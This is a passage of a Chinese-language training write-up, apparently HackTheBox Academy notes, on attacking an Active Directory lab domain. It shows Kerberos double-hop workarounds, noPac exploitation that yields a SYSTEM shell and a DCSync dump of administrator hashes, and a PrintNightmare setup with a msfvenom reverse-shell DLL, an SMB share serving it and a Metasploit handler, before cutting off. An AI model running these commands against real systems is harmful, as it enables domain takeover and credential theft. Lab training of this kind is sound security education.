class="hljs-title">SHA1</span>-96</span><br><span class="hljs-function">        <span class="hljs-title">Ticket</span> <span class="hljs-title">Flags</span> 0<span class="hljs-title">x60a10000</span> -&gt; <span class="hljs-title">forwardable</span> <span class="hljs-title">forwarded</span> <span class="hljs-title">renewable</span> <span class="hljs-title">pre_authent</span> <span class="hljs-title">name_canonicalize</span></span><br><span class="hljs-function">        <span class="hljs-title">Start</span> <span class="hljs-title">Time</span>: 6/28/2022 9:13:38 (<span class="hljs-title">local</span>)</span><br><span class="hljs-function">        <span class="hljs-title">End</span> <span class="hljs-title">Time</span>:   6/28/2022 19:13:38 (<span class="hljs-title">local</span>)</span><br><span class="hljs-function">        <span class="hljs-title">Renew</span> <span class="hljs-title">Time</span>: 7/5/2022 9:13:38 (<span class="hljs-title">local</span>)</span><br><span class="hljs-function">        <span class="hljs-title">Session</span> <span class="hljs-title">Key</span> <span class="hljs-title">Type</span>: <span class="hljs-title">AES</span>-256-<span class="hljs-title">CTS</span>-<span class="hljs-title">HMAC</span>-<span class="hljs-title">SHA1</span>-96</span><br><span class="hljs-function">        <span class="hljs-title">Cache</span> <span class="hljs-title">Flags</span>: 0<span class="hljs-title">x2</span> -&gt; <span class="hljs-title">DELEGATION</span></span><br><span class="hljs-function">        <span class="hljs-title">Kdc</span> <span class="hljs-title">Called</span>: <span class="hljs-title">DC01.INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">#1&gt;     <span class="hljs-title">Client</span>: <span class="hljs-title">backupadm</span> @ <span class="hljs-title">INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">Server</span>: <span class="hljs-title">krbtgt</span>/<span class="hljs-title">INLANEFREIGHT.LOCAL</span> @ <span class="hljs-title">INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">KerbTicket</span> <span class="hljs-title">Encryption</span> <span class="hljs-title">Type</span>: <span class="hljs-title">AES</span>-256-<span class="hljs-title">CTS</span>-<span class="hljs-title">HMAC</span>-<span class="hljs-title">SHA1</span>-96</span><br><span class="hljs-function">        <span class="hljs-title">Ticket</span> <span class="hljs-title">Flags</span> 0<span class="hljs-title">x40e10000</span> -&gt; <span class="hljs-title">forwardable</span> <span class="hljs-title">renewable</span> <span class="hljs-title">initial</span> <span class="hljs-title">pre_authent</span> <span class="hljs-title">name_canonicalize</span></span><br><span class="hljs-function">        <span class="hljs-title">Start</span> <span class="hljs-title">Time</span>: 6/28/2022 9:13:38 (<span class="hljs-title">local</span>)</span><br><span class="hljs-function">        <span class="hljs-title">End</span> <span class="hljs-title">Time</span>:   6/28/2022 19:13:38 (<span class="hljs-title">local</span>)</span><br><span class="hljs-function">        <span class="hljs-title">Renew</span> <span class="hljs-title">Time</span>: 7/5/2022 9:13:38 (<span class="hljs-title">local</span>)</span><br><span class="hljs-function">        <span class="hljs-title">Session</span> <span class="hljs-title">Key</span> <span class="hljs-title">Type</span>: <span class="hljs-title">AES</span>-256-<span class="hljs-title">CTS</span>-<span class="hljs-title">HMAC</span>-<span class="hljs-title">SHA1</span>-96</span><br><span class="hljs-function">        <span class="hljs-title">Cache</span> <span class="hljs-title">Flags</span>: 0<span class="hljs-title">x1</span> -&gt; <span class="hljs-title">PRIMARY</span></span><br><span class="hljs-function">        <span class="hljs-title">Kdc</span> <span class="hljs-title">Called</span>: <span class="hljs-title">DC01.INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">#2&gt;     <span class="hljs-title">Client</span>: <span class="hljs-title">backupadm</span> @ <span class="hljs-title">INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">Server</span>: <span class="hljs-title">ProtectedStorage</span>/<span class="hljs-title">DC01.INLANEFREIGHT.LOCAL</span> @ <span class="hljs-title">INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">KerbTicket</span> <span class="hljs-title">Encryption</span> <span class="hljs-title">Type</span>: <span class="hljs-title">AES</span>-256-<span class="hljs-title">CTS</span>-<span class="hljs-title">HMAC</span>-<span class="hljs-title">SHA1</span>-96</span><br><span class="hljs-function">        <span class="hljs-title">Ticket</span> <span class="hljs-title">Flags</span> 0<span class="hljs-title">x40a50000</span> -&gt; <span class="hljs-title">forwardable</span> <span class="hljs-title">renewable</span> <span class="hljs-title">pre_authent</span> <span class="hljs-title">ok_as_delegate</span> <span class="hljs-title">name_canonicalize</span></span><br><span class="hljs-function">        <span class="hljs-title">Start</span> <span class="hljs-title">Time</span>: 6/28/2022 9:13:38 (<span class="hljs-title">local</span>)</span><br><span class="hljs-function">        <span class="hljs-title">End</span> <span class="hljs-title">Time</span>:   6/28/2022 19:13:38 (<span class="hljs-title">local</span>)</span><br><span class="hljs-function">        <span class="hljs-title">Renew</span> <span class="hljs-title">Time</span>: 7/5/2022 9:13:38 (<span class="hljs-title">local</span>)</span><br><span class="hljs-function">        <span class="hljs-title">Session</span> <span class="hljs-title">Key</span> <span class="hljs-title">Type</span>: <span class="hljs-title">AES</span>-256-<span class="hljs-title">CTS</span>-<span class="hljs-title">HMAC</span>-<span class="hljs-title">SHA1</span>-96</span><br><span class="hljs-function">        <span class="hljs-title">Cache</span> <span class="hljs-title">Flags</span>: 0</span><br><span class="hljs-function">        <span class="hljs-title">Kdc</span> <span class="hljs-title">Called</span>: <span class="hljs-title">DC01.INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">#3&gt;     <span class="hljs-title">Client</span>: <span class="hljs-title">backupadm</span> @ <span class="hljs-title">INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">Server</span>: <span class="hljs-title">cifs</span>/<span class="hljs-title">DC01.INLANEFREIGHT.LOCAL</span> @ <span class="hljs-title">INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">KerbTicket</span> <span class="hljs-title">Encryption</span> <span class="hljs-title">Type</span>: <span class="hljs-title">AES</span>-256-<span class="hljs-title">CTS</span>-<span class="hljs-title">HMAC</span>-<span class="hljs-title">SHA1</span>-96</span><br><span class="hljs-function">        <span class="hljs-title">Ticket</span> <span class="hljs-title">Flags</span> 0<span class="hljs-title">x40a50000</span> -&gt; <span class="hljs-title">forwardable</span> <span class="hljs-title">renewable</span> <span class="hljs-title">pre_authent</span> <span class="hljs-title">ok_as_delegate</span> <span class="hljs-title">name_canonicalize</span></span><br><span class="hljs-function">        <span class="hljs-title">Start</span> <span class="hljs-title">Time</span>: 6/28/2022 9:13:38 (<span class="hljs-title">local</span>)</span><br><span class="hljs-function">        <span class="hljs-title">End</span> <span class="hljs-title">Time</span>:   6/28/2022 19:13:38 (<span class="hljs-title">local</span>)</span><br><span class="hljs-function">        <span class="hljs-title">Renew</span> <span class="hljs-title">Time</span>: 7/5/2022 9:13:38 (<span class="hljs-title">local</span>)</span><br><span class="hljs-function">        <span class="hljs-title">Session</span> <span class="hljs-title">Key</span> <span class="hljs-title">Type</span>: <span class="hljs-title">AES</span>-256-<span class="hljs-title">CTS</span>-<span class="hljs-title">HMAC</span>-<span class="hljs-title">SHA1</span>-96</span><br><span class="hljs-function">        <span class="hljs-title">Cache</span> <span class="hljs-title">Flags</span>: 0</span><br><span class="hljs-function">        <span class="hljs-title">Kdc</span> <span class="hljs-title">Called</span>: <span class="hljs-title">DC01.INLANEFREIGHT.LOCAL</span></span><br></code></pre></td></tr></table></figure>

<h4 id="注册-PSSession-配置"><a href="#注册-PSSession-配置" class="headerlink" title="注册 PSSession 配置"></a>注册 PSSession 配置</h4><p><strong>建立一个 WinRM 会话</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Enter-PSSession</span> <span class="hljs-literal">-ComputerName</span> ACADEMY<span class="hljs-literal">-AEN-DEV01</span>.INLANEFREIGHT.LOCAL <span class="hljs-literal">-Credential</span> inlanefreight\backupadm<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">AEN</span>-<span class="hljs-type">DEV01.INLANEFREIGHT.LOCAL</span>]: <span class="hljs-built_in">PS</span> C:\Users\backupadm\Documents&gt; klist<br><br>Current LogonId is <span class="hljs-number">0</span>:<span class="hljs-number">0</span>x11e387<br><br>Cached Tickets: (<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#0&gt;     Client: backupadm @ INLANEFREIGHT.LOCAL</span><br>       Server: HTTP/ACADEMY<span class="hljs-literal">-AEN-DEV01</span>.INLANEFREIGHT.LOCAL <span class="hljs-selector-tag">@</span> INLANEFREIGHT.LOCAL<br>       KerbTicket Encryption <span class="hljs-built_in">Type</span>: AES<span class="hljs-literal">-256-CTS-HMAC-SHA1-96</span><br>       Ticket Flags <span class="hljs-number">0</span>x40a10000 -&gt; forwardable renewable pre_authent name_canonicalize<br>       <span class="hljs-built_in">Start</span> Time: <span class="hljs-number">6</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">09</span>:<span class="hljs-number">19</span> (local)<br>       <span class="hljs-keyword">End</span> Time:   <span class="hljs-number">6</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span> <span class="hljs-number">19</span>:<span class="hljs-number">09</span>:<span class="hljs-number">19</span> (local)<br>       Renew Time: <span class="hljs-number">0</span><br>       Session Key <span class="hljs-built_in">Type</span>: AES<span class="hljs-literal">-256-CTS-HMAC-SHA1-96</span><br>       Cache Flags: <span class="hljs-number">0</span>x8 -&gt; ASC<br>       Kdc Called:<br></code></pre></td></tr></table></figure>

<p><strong>也不能直接使用 PowerView 与域控制器进行交互</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">AEN</span>-<span class="hljs-type">DEV01.INLANEFREIGHT.LOCAL</span>]: <span class="hljs-built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="hljs-built_in">Import-Module</span> .\PowerView.ps1<br>[<span class="hljs-type">ACADEMY</span>-<span class="hljs-type">AEN</span>-<span class="hljs-type">DEV01.INLANEFREIGHT.LOCAL</span>]: <span class="hljs-built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="hljs-built_in">get-domainuser</span> <span class="hljs-literal">-spn</span> | <span class="hljs-built_in">select</span> samaccountname<br><br>Exception calling <span class="hljs-string">&quot;FindAll&quot;</span> with <span class="hljs-string">&quot;0&quot;</span> argument(s): <span class="hljs-string">&quot;An operations error occurred.</span><br><span class="hljs-string">&quot;</span><br>At C:\Users\backupadm\Documents\PowerView.ps1:<span class="hljs-number">5253</span> char:<span class="hljs-number">20</span><br>+             <span class="hljs-keyword">else</span> &#123; <span class="hljs-variable">$Results</span> = <span class="hljs-variable">$UserSearcher</span>.FindAll() &#125;<br>+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException<br>   + FullyQualifiedErrorId : DirectoryServicesCOMException<br></code></pre></td></tr></table></figure>

<p><strong>使用 <code>Register-PSSessionConfiguration</code> cmdlet 注册一个新的会话配置</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Register-PSSessionConfiguration</span> <span class="hljs-literal">-Name</span> backupadmsess <span class="hljs-literal">-RunAsCredential</span> inlanefreight\backupadm<br><br> WARNING: When RunAs is enabled <span class="hljs-keyword">in</span> a Windows PowerShell session configuration, the Windows security model cannot enforce<br> a security boundary between different user sessions that are created by <span class="hljs-keyword">using</span> this endpoint. Verify that the Windows<br>PowerShell runspace configuration is restricted to only the necessary <span class="hljs-built_in">set</span> of cmdlets and capabilities.<br>WARNING: <span class="hljs-built_in">Register-PSSessionConfiguration</span> may need to restart the WinRM service <span class="hljs-keyword">if</span> a configuration <span class="hljs-keyword">using</span> this name has<br>recently been unregistered, certain system <span class="hljs-keyword">data</span> structures may still be cached. <span class="hljs-keyword">In</span> that case, a restart of WinRM may be<br> required.<br>All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session<br>configurations that are created with the <span class="hljs-built_in">Register-PSSessionConfiguration</span> cmdlet, are disconnected.<br><br>   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin<br><br><span class="hljs-built_in">Type</span>            Keys                                Name<br><span class="hljs-literal">----</span>            <span class="hljs-literal">----</span>                                <span class="hljs-literal">----</span><br>Container       &#123;Name=backupadmsess&#125;                backupadmsess<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Enter-PSSession</span> <span class="hljs-literal">-ComputerName</span> DEV01 <span class="hljs-literal">-Credential</span> INLANEFREIGHT\backupadm <span class="hljs-literal">-ConfigurationName</span>  backupadmsess<br>[<span class="hljs-type">DEV01</span>]: <span class="hljs-built_in">PS</span> C:\Users\backupadm\Documents&gt; klist<br><br>Current LogonId is <span class="hljs-number">0</span>:<span class="hljs-number">0</span>x2239ba<br><br>Cached Tickets: (<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#0&gt;     Client: backupadm @ INLANEFREIGHT.LOCAL</span><br>       Server: krbtgt/INLANEFREIGHT.LOCAL <span class="hljs-selector-tag">@</span> INLANEFREIGHT.LOCAL<br>       KerbTicket Encryption <span class="hljs-built_in">Type</span>: AES<span class="hljs-literal">-256-CTS-HMAC-SHA1-96</span><br>       Ticket Flags <span class="hljs-number">0</span>x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize<br>       <span class="hljs-built_in">Start</span> Time: <span class="hljs-number">6</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span> <span class="hljs-number">13</span>:<span class="hljs-number">24</span>:<span class="hljs-number">37</span> (local)<br>       <span class="hljs-keyword">End</span> Time:   <span class="hljs-number">6</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span> <span class="hljs-number">23</span>:<span class="hljs-number">24</span>:<span class="hljs-number">37</span> (local)<br>       Renew Time: <span class="hljs-number">7</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2022</span> <span class="hljs-number">13</span>:<span class="hljs-number">24</span>:<span class="hljs-number">37</span> (local)<br>       Session Key <span class="hljs-built_in">Type</span>: AES<span class="hljs-literal">-256-CTS-HMAC-SHA1-96</span><br>       Cache Flags: <span class="hljs-number">0</span>x1 -&gt; PRIMARY<br>       Kdc Called: DC01<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">DEV01</span>]: <span class="hljs-built_in">PS</span> C:\Users\Public&gt; <span class="hljs-built_in">get-domainuser</span> <span class="hljs-literal">-spn</span> | <span class="hljs-built_in">select</span> samaccountname<br><br>samaccountname<br><span class="hljs-literal">--------------</span><br>azureconnect<br>backupjob<br>krbtgt<br>mssqlsvc<br>sqltest<br>sqlqa<br>sqldev<br>mssqladm<br>svc_sql<br>sqlprod<br>sapsso<br>sapvc<br>vmwarescvc<br></code></pre></td></tr></table></figure>

<h2 id="前沿漏洞"><a href="#前沿漏洞" class="headerlink" title="前沿漏洞"></a>前沿漏洞</h2><h3 id="NoPac-SamAccountName-Spoofing"><a href="#NoPac-SamAccountName-Spoofing" class="headerlink" title="NoPac (SamAccountName Spoofing)"></a>NoPac (SamAccountName Spoofing)</h3><p>一个新兴威胁的典型例子是 Sam_The_Admin 漏洞，也被称为 <code>noPac</code> 或 <code>SamAccountName Spoofing</code> ，于 2021 年底发布。该漏洞涉及两个 CVE：2021-42278 和 2021-42287，允许在单个命令内实现从任何标准域用户到域管理员级别的跨域权限提升。以下是关于此漏洞每个 CVE 提供的简要分析。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ git <span class="hljs-built_in">clone</span> https://github.com/Ridter/noPac.git<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap<br><br>███    ██  ██████  ██████   █████   ██████ <br>████   ██ ██    ██ ██   ██ ██   ██ ██      <br>██ ██  ██ ██    ██ ██████  ███████ ██      <br>██  ██ ██ ██    ██ ██      ██   ██ ██      <br>██   ████  ██████  ██      ██   ██  ██████ <br>                                           <br>[*] Current ms-DS-MachineAccountQuota = 10<br>[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484<br>[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap<br><br>███    ██  ██████  ██████   █████   ██████ <br>████   ██ ██    ██ ██   ██ ██   ██ ██      <br>██ ██  ██ ██    ██ ██████  ███████ ██      <br>██  ██ ██ ██    ██ ██      ██   ██ ██      <br>██   ████  ██████  ██      ██   ██  ██████ <br>                                               <br>[*] Current ms-DS-MachineAccountQuota = 10<br>[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL<br>[*] will try to impersonat administrator<br>[*] Adding Computer Account <span class="hljs-string">&quot;WIN-LWJFQMAXRVN$&quot;</span><br>[*] MachineAccount <span class="hljs-string">&quot;WIN-LWJFQMAXRVN$&quot;</span> password = &amp;A<span class="hljs-comment">#x8X^5iLva</span><br>[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &amp;A<span class="hljs-comment">#x8X^5iLva.</span><br>[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL<br>[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01<br>[*] Saving ticket <span class="hljs-keyword">in</span> ACADEMY-EA-DC01.ccache<br>[*] Resting the machine account to WIN-LWJFQMAXRVN$<br>[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value<br>[*] Using TGT from cache<br>[*] Impersonating administrator<br>[*] 	Requesting S4U2self<br>[*] Saving ticket <span class="hljs-keyword">in</span> administrator.ccache<br>[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL<br>[*] Rename ccache with target ...<br>[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$<br>[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.<br>[*] Pls make sure your choice hostname and the -dc-ip are same machine !!<br>[*] Exploiting..<br>[!] Launching semi-interactive shell - Careful what you execute<br>C:\Windows\system32&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ <span class="hljs-built_in">ls</span><br><br>administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils<br>README.md  scanner.py<br></code></pre></td></tr></table></figure>

<h3 id="使用-noPac-对内置管理员账户进行-DCSync"><a href="#使用-noPac-对内置管理员账户进行-DCSync" class="headerlink" title="使用 noPac 对内置管理员账户进行 DCSync"></a>使用 noPac 对内置管理员账户进行 DCSync</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator<br><br>███    ██  ██████  ██████   █████   ██████ <br>████   ██ ██    ██ ██   ██ ██   ██ ██      <br>██ ██  ██ ██    ██ ██████  ███████ ██      <br>██  ██ ██ ██    ██ ██      ██   ██ ██      <br>██   ████  ██████  ██      ██   ██  ██████ <br>                                                                    <br>[*] Current ms-DS-MachineAccountQuota = 10<br>[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL<br>[*] will try to impersonat administrator<br>[*] Alreay have user administrator ticket <span class="hljs-keyword">for</span> target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL<br>[*] Pls make sure your choice hostname and the -dc-ip are same machine !!<br>[*] Exploiting..<br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::<br>[*] Kerberos keys grabbed<br>inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6<br>inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25<br>inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f<br>[*] Cleaning up...<br></code></pre></td></tr></table></figure>

<h2 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h2><p><code>PrintNightmare</code> 是针对两个漏洞（CVE-2021-34527 和 CVE-2021-1675）的昵称，这些漏洞存在于所有 Windows 操作系统上运行的打印后台处理程序服务中。基于这些漏洞，已编写了许多允许权限提升和远程代码执行的利用程序。在 Windows 权限提升模块中涵盖了利用此漏洞进行本地权限提升的内容，但在 Active Directory 环境中练习以获取对主机的远程访问同样重要。让我们通过一个可以让我们在运行于 Windows Server 2019 主机上的域控制器上获得 SYSTEM 会话的漏洞利用来实践一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ git <span class="hljs-built_in">clone</span> https://github.com/cube0x0/CVE-2021-1675.git<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 uninstall impacket<br>git <span class="hljs-built_in">clone</span> https://github.com/cube0x0/impacket<br><span class="hljs-built_in">cd</span> impacket<br>python3 ./setup.py install<br></code></pre></td></tr></table></figure>

<h4 id="枚举-MS-RPRN"><a href="#枚举-MS-RPRN" class="headerlink" title="枚举 MS-RPRN"></a>枚举 MS-RPRN</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep <span class="hljs-string">&#x27;MS-RPRN|MS-PAR&#x27;</span><br><br>Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol <br>Protocol: [MS-RPRN]: Print System Remote Protocol <br></code></pre></td></tr></table></figure>

<h4 id="生成-DLL-载荷-使用-smbserver-py-创建共享"><a href="#生成-DLL-载荷-使用-smbserver-py-创建共享" class="headerlink" title="生成 DLL 载荷&#x2F;使用 smbserver.py 创建共享"></a>生成 DLL 载荷&#x2F;使用 smbserver.py 创建共享</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll<br><br>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: x64 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 510 bytes<br>Final size of dll file: 8704 bytes<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll<br><br>Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation<br><br>[*] Config file parsed<br>[*] Callback added <span class="hljs-keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0<br>[*] Callback added <span class="hljs-keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0<br>[*] Config file parsed<br>[*] Config file parsed<br>[*] Config file parsed<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/handler<br>[*] Using configured payload generic/shell_reverse_tcp<br>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; <span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp<br>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; <span class="hljs-built_in">set</span> LHOST 172.16.5.225<br>LHOST =&gt; 10.3.88.114<br>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; <span class="hljs-built_in">set</span> LPORT 8080<br>LPORT =&gt; 8080<br>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; run<br><br>[*] Started reverse 